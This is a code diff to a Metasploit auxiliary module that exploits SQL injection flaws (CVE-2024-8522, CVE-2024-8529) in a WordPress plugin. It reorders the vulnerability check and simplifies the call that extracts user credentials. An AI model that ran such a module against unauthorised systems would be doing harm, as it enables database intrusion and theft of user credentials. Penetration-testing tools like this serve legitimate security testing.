@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
     ]
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     sqli_param = action.name.downcase.include?('cve-2024-8522') ? 'c_only_fields' : 'c_fields'
     description = action.name.downcase.include?('cve-2024-8522') ? 'CVE-2024-8522' : 'CVE-2024-8529'
 
@@ -68,17 +68,10 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Connection failed') unless res
     end
 
+    fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.') unless @sqli.test_vulnerable
+    print_good('Target is vulnerable to SQLi!')
+
     wordpress_sqli_initialize(@sqli)
-
-    unless @sqli.test_vulnerable
-      fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.')
-    end
-
-    table_prefix = wordpress_sqli_identify_table_prefix
-    unless table_prefix
-      fail_with(Failure::NotFound, 'Failed to identify the WordPress table prefix.')
-    end
-
-    wordpress_sqli_get_users_credentials(table_prefix, ip, datastore['COUNT'])
+    wordpress_sqli_get_users_credentials(datastore['COUNT'])
   end
 end
